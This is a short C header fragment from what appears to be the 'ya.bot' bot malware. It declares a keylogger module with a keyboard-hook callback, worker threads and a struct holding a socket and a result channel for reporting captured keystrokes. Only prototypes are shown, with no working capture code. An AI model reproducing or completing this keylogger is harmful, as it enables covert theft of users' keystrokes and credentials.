/*  ya.bot  */

#ifndef NO_KEYLOG
DWORD WINAPI keylog_buffer(LPVOID param);
LRESULT CALLBACK keylog_event(int nCode, WPARAM wParam, LPARAM lParam);
DWORD WINAPI keylog_main(LPVOID param);

typedef struct SKeylogInfo
{
	SOCKET m_bsock;
	char m_szAction[LOWBUF];
	char m_szDestination[LOWBUF];
	char m_szResultChannel[LOWBUF];
	bool m_bSilent;
	bool m_bVerbose;
} SKeylogInfo;
#endif